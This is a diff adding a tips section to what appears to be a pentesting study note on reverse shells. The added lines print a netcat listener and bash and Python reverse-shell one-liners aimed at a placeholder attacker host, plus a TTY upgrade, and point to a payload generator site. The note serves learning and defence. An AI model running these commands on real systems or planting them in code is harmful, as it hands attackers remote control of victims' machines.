@@ -45,3 +45,23 @@ From a defender's side, outbound traffic monitoring is key — most organization
 - Netcat (nc): a networking utility used to create listeners and send/receive data over TCP/UDP
 - Payload: the code executed on the victim machine to establish the reverse shell connection
 - RCE (Remote Code Execution): a vulnerability that allows running arbitrary commands on a remote machine
+
+## One Tip / Tool
+
+Tool: `Netcat` for basic shells and `revshells.com` for generating payloads in any language
+
+```bash
+# Attacker listener
+nc -lvnp 4444
+
+# Bash reverse shell
+bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+
+# Python reverse shell
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+# Upgrading to a stable TTY shell after connecting
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+Bookmark `https://revshells.com` — it generates reverse shell payloads in every language (bash, python, php, ruby, perl, powershell) with your IP and port pre-filled. Every pentester uses it.
